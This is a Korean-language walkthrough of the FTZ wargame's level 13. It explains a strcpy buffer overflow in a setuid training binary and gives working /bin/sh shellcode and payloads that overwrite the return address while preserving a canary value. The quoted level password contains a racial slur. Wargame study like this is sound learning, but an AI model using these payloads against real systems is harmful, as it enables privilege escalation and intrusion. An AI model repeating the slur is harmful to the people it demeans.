# FTZ 13  
## 문제설명  
attackme 프로그램을 공격하자. attackme 소스코드는 hint에 적혀있다. 소스코드는 아래와 같다.  
```
#include <stdlib.h>

main(int argc, char *argv[])
{
	long i=0x1234567;
	char buf[1024];

	setreuid( 3094, 3094 );
	if(argc > 1)
	strcpy(buf, argv[1]);

	if(i != 0x1234567) {
		printf("Warning: Buffer Overflow !!! \n");
		kill(0,11);	
	}
}
```  

## 문제풀이  
### 풀이과정  
1. ls -al을 해보자. attackme 프로그램에 level14 권한으로 setuid가 걸려있다. BOF 공격으로 attackme 파일에서 쉘을 열고 level14 권한으로 해당 레벨의 password를 알아내면 될 것 같다.  
hint 파일을 해석해보자.  
```
#include <stdlib.h>

main(int argc, char *argv[]) # 프로그램 실행과 동시에 입력 전달
{
        long i=0x1234567; # 4byte 정수형인 i 변수에 0x1234567 값을 저장
        char buf[1024]; # 문자형인buf 변수에 1024 만큼의 사이즈 할당

        setreuid( 3094, 3094 ); # level14의 ruid, euid 할당
        if(argc > 1) # argv로 넘겨받는 사용자 입력이 1개 이상 있다면
        strcpy(buf, argv[1]); # 사용자 입력 내용을 buf에 복사

        if(i != 0x1234567) { # i변수에 저장된 값이 0x1234567이 아니라면
                printf("Warning: Buffer Overflow !!! \n");
                kill(0,11); # 버퍼오버플로우 위험 경고문 출력과 프로그램 종료
        }
}

```  
이 문제에는 **스택 가드**가 있다. 스택가드란 우리가 level12와 같이 bof 공격으로 ret을 변조하게 되면 당연히 스택가드 영역도 함께 다른 값으로 변조될 수 밖에 없다. 그러므로 스택가드에 저장되어있는 값이 바뀌었다는 것은 bof 공격이 일어났다는 것을 의미하고, 이 사실이 확인되면 프로세스 실행을 차단해서 공격을 방어할 수 있다.  

따라서 우리는 스택가드 영역을 변조하지 않고 공격해야한다!!  

2. strcpy(buf, argv[1])에서 BOF 공격이 가능해보인다! 공격을 위해 우선 스택구조를 파악해보자  


|ret|
|:---:|
|sfp|
|i|
|buf|

bof 공격 시 i는 원래 값 그대로 덮어씌워야할 것 같다.  

3. 디버깅을 위해 attackme 파일을 /tmp/ 디렉토리로 복사하고 gdb를 실행시키자!  ```
```
gdb attackme
set disassembly-flavor intel // 우리에게 익숙한 intel 어셈블리로 바꾼다.
disas main // main을 디스어셈블한다.
```  
4.  
![1](https://user-images.githubusercontent.com/46364778/89095961-686f2800-d40d-11ea-93d6-2df44804efbb.jpg)   

* ```sub esp, 0x418```: 0x418(1048byte) 만큼 공간을 확보한다.  
* ```mov DWORD PTR [ebp-12], 0x1234567```을 보아 i 변수에는 12byte가 할당되었다. 1048byte 중 12byte 사용. 그리고 0x1234567값을 저장한다.  
* ```sub esp, 0x8```: 4byte를 2번 뺀다.  


* ```push 0xc16```: 0xc16(3094)를 두번 넣고, ```call 0x8048370 <setreuid>``` 를 보아 이 명령어는 setreuid(3094,3094); 부분이다.  


* ```cmp DWORD PTR [ebp+8], 0x1``` : if (argc > 1) 부분, argc는 ebp가 있는 위치보다 8byte 위에 있는 모양이다. ebp는 현재 i 변수를 가리키는 부분(sfp 다음스택)에 있다.  
* **```jle <main+69>```** : jump if less or equal, 앞의 cmp 결과 앞의 값([ebp+8])이 1보다 작거나 같을때, 즉 argc <= 1, if 문이 false 일 때, main+69로 이동하라는 소리다. main+69에는 ```if(i != 0x1234567)``` 명령어가 있다.  
* ```sub esp, 0x8```  
* ```mov eax, DWORD PTR [ebp+12]``` : eax에 [ebp-1048] 주소에 담긴 값을 넣는다. DWORD PTR 은 해당 주소에서 double word(32비트) 를 읽겠다는 뜻이다. 아마 argv[1]을 불러오는 것 같다. argv[1]은 프로그램 실행할 때 사용자가 입력한 값이다!  
* ```add eax, 0x4``` : eax에 4byte를 더한다. 왜??  
* ```push DWORD PTR [eax]```: eax에서 32byte를 읽어와 스택에 push한다.  
* ```lea eax, [ebp-1048]``` : eax에 [ebp-1048] 주소의 값을 넣는다. 즉, eax에 buf 주소값을 넣는다.  
* ```push eax``` : eax에 담긴 주소를 push한다.  
* ```call <strcpy>```: 공유라이브러리에 있는 strcpy 함수를 부르는듯  
**==> 의문점: strcpy(buf, argv[1])를 어떻게 하는거지..? 알아서 POP 해서 쓰는건가봐! 함수에 pop 명령어가 있지않을까??**  
* ```add esp, 0x10```  
* ```cmp DWORD PTR [ebp-12], 0x1234567```: [ebp-12]에 있는 값, 즉 i 값과 0x1234567을 비교  
=> if ( i != 0x1234567)  
* **```je <main+109>```** : jump if equal, 같으면 main+109 ```leave``` 명령(함수에필로그 함수)으로 이동한다.
* 만약 같지 않다면 print함수 출력하고 등등...  

5. 암튼 결론은, 1048byte가 할당되었고
i 변수에는 12byte가 사용되고, buf 변수에는 나머지 1036byte가 할당되었음을 알 수 있다.  
즉, i는 dummy값이 8byte, buf는 12byte이다.  

|argv[1] 4byte|
|:---:|
|argv 4byte|
|ret 4byte|
|sfp 4byte|
|dummy 8byte|
|i 4byte|
|dummy 12byte|
|buf 1024byte|

6. 스택 구조를 파악했으니 ret을 shell code의 주소로 덮어씌우는 공격 페이로드를 작성해보자.  
```
export shell = `python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

echo $shell을 해보면 공격 코드가 들어있는 환경변수가 출력된다!
```  

7. 해당 환경변수의 주소를 얻는 소스코드를 실행시켜 환경변수의 값을 알아낸다.
```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[1]){
	char *env;

	env=getenv("SHELL");
	printf("address = %p\n",env);

	return 0;
}
```  
```
gcc -o getenv getenv.c  
./getenv
```  
컴파일 후 실행시키면 쉘코드의 주소가 나온다.  

9. 이제 페이로드를 작성해보자.  
선언된 buf 크기 1024 + dummy 값만큼 null을 채워주고,  
if문 조건을 우회하기 위해 선언된 변수 i의 값은 그대로 넣어준다.(리틀엔디안으로)  
그리고 남은 dummy와 sfp를 마저 채우고 ret주소를 shell code가 등록된 환경변수 주소 값을 넣어주면 된다.  
```
./attackme `python -c 'print "\x90"*1036+"\x67\x45\x23\x01"+"\x90"*12+"(환경변수 주소 리틀엔디안으로)"'`

// 리틀엔디안 예시
쉘코드 주소 = 0xbffffef6
페이로드 안의 쉘코드 주소 = \xf6\xfe\xff\xbf
```  

* 작성 예시  
```
아래의 n에는 적절한 byte 수를 계산하여 넣는다. 그로인해 ret지점에 정확히 환경변수 주소가 덮이게 해야한다.
즉 n = str~ret 거리

// strcpy
./실행파일 `python –c ‘print “A”*n+”쉘코드 주소”’`

얘는 strcpy에서 argv[1]를 copy하는거니까 실행파일 먼저 실행할때 인자로 넘겨줘야하고

// gets
(python -c 'print"\x90"*n+"쉘코드 주소"'; cat) | ./실행파일

얘는 실행파일을 실행하고 입력해줘야하기 때문!!!
쉘이 안꺼지게 세미콜론으로 또 하나의 명령을 줌
```  
> 익스플로잇: 대상의 취약점으로 대상의 시스템에 침투하는 행위. 즉, 취약점을 악용하는 방법 그 자체  
ex. bof, sql injection, 설정오류 등  
> 페이로드 : 대상의 취약점으로 대상 시스템에 익스플로잇 한 뒤, 수행하는 악의적 행위. 즉, 시스템에 실행시키고자 하는 코드  
ex. 리버스쉘(윈도우 cmd로 대상 시스템에서 공격자에게 역으로 접속을 시도하는 페이로드), 바인드쉘(대상 시스템의 응답 포트에 cmd를 바인드해 공격자가 접속할 수 있도록 유도하는 페이로드)  
> 쉘코드: 공격을 수행할 때 페이로드로 사용되는 명령 집합. 쉘코드는 보통 어셈블리어로 작성하는데, 연속된 명령을 대상 시스템에서 실행한 후 명령 쉘을 얻는다.  

10. 페이로드를 실행시키니 쉘이 성공적으로 떨어진다. 그리고 my-pass 명령어를 통해 level14의 패스워드를 얻는다.  
11. 패스워드는 "what that nigga want?"  

### 다른 공격 코드 예시  
* 기본적인 BOF(nop sled 이용) : NOP(500) + shellcode(25) + NOP(511) + 0x1234567(4) + NOP(12) + RET(4)  
* 환경변수를 이용한 BOF : NOP(1036) + 0x1234567(4) + NOP(12) + RET(4)  
* RTL: NOP(1036) + 0x1234567(4) + NOP(12) + system(4) + exit(4) + /bin/sh(4)  
* ROP(Return Oriented Programming) 공격이 가능한 문제라고 한다! 나중에 한번 해보자!  
ROP은 NX bit와 ASLR(Address Space Layout Randomize) 같은 메모리 보호 기법을 우회하기 위한 공격 기법으로, RTL, RTL chaining, GOT overwrite 기법을 활용하여 취약한 프로그램 내부의 기계어 코드들을 이용해 콜스택을 제어하는 공격 기법  
[출처](https://d4m0n.tistory.com/84)

## 그 외  
### DWORD PTR  
참고: dword ptr에 의해 4바이트의 값을 읽어 들인다.  
//word ptr이면 2바이트, byte ptr이면 1바이트  
//되도록 [ ] 전에 dword ptr처럼 메모리 크기를 지정해주자  

* [] 기호  
*참고로 []는 포인터역할이다, [주소]이면, 그 주소에 있는 값을 가리키는 것*  
*nasm에서 메모리 표현방식은 [](effective address)이다*  
1) 어셈블리어에서 []는 주소를 의미, mov에서 []가 쓰이면 주소를 참조하는 것으로 쓰임  
2) [] 기호를 쓰면 내부에서 사칙연산이 가능  
ex. ```lea eax, dword ptr ss[ebp-4];``` 코드에 [] 기호가 없었다면  
```mov eax,ebp; sub eax,4;```  
두 개의 코드를 써줘야 하는 번거로움이 생긴다. 따라서 사칙연산 명령어를 쓰지 않고도 [ ] 기호를 쓰면 내부에서 사칙연산이 가능해진다.


### mov  
mov des, src : src 위치에 있는 데이터를 복사하여 dest 위치에 저장  
1) 메모리와 레지스터 사이의 데이터 이동  
2) 레지스터와 레지스터, 값을 레지스터나 메모리에 대입할 때 사용  
3) src와 dest의 크기가 같아야함  
MOV는 특정 메모리나 레지스터의 값을 옮기기만 하는 것이지
옮겨지는 값에 연산을 할 수 없다.

### lea(Load Effective Address): 유효 주소 로드  
lea dest, src : src오퍼랜드에서 지정된 주소를 dest로 로드  
1) src의 오퍼랜드는 메모리에 위치해야함.  
2) mov와 비교하여 메모리 주소 표현 및 레지스터에 대한 직접적인 연산이 가능  

### mov과 lea의 차이점  
mov는 src 위치에 있는 "값"을 dest위치에 저장   
lea는 dest위치(레지스터만 가능)에 src 위치에 있는 주소 값을 저장  

ex.  
```
예제 1. ebp=0x12345, *ebp=100 일 때, eax 값이 무엇일까?

MOV eax, dword ptr ds[ebp];       
LEA eax, dword ptr ds[ebp];                

답

MOV의 eax = 100
LEA의 eax = 0x12345


예제 2. ebp=0x123e456, 0x123e452 메모리 주소에서 4바이트 공간에 100이라는 값이 들어있을 때,

MOV eax, dword ptr ss:[ebp-4];  
LEA eax, dword ptr ss:[ebp-4];      

답
MOV의 eax = 100
LEA의 eax = 0x123e456

=>
MOV명령어를 사용한 eax에는 [...]가 src라면 ...의 주소에 들어있는 값을 넣는 것이다.
LEA명령어를 사용한 eax에는 [...]가 src라면 ...의 주소 값을 넣는 것이다.
```  

```
// 단순히 값 넣고 땅따먹기  
// 위는 eax, ebx, ecx가 포인터인거고 여긴 그냥 값 담은 변수랄까
mov eax, 1
어셈블리어: mov eax,0x1

mov ebx, 4
어셈블리어: mov ebx,0x4

mov ecx, 7
어셈블리어: mov ecx,0x7

lea eax, [eax+ecx]
어셈블리어: lea eax,[eax+ecx*1]
// eax+ecx 연산결과가 eax에 저장된다. 즉, 8

lea ebx, [ebx*4]
어셈블리어: lea ebx,[ebx*4+0x0]
// ebx에 16이 저장된다.

mov eax, [eax+ecx]
어셈블리어: mov eax, DWORD PTR [eax+ecx*1]
// eax+ecx의 연살결과인 주소가 가리키는 값을 가져와 eax에 저장한다. 즉, 주소 15가 가리키는 값을 가져와 eax에 저장
```
